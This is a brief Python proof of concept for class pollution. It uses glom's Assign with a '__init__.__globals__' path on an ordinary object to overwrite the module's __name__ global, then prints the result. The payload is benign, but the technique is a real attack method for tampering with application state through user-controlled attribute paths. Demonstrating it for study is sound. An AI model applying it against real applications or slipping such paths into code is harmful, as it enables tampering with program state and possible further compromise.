import requests, random,glom,subprocess
class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj = Animal('cat', 11)
spec = glom.Assign('__init__.__globals__.__name__', 'polluted')
_ = glom.glom(obj, spec)

print(__name__)
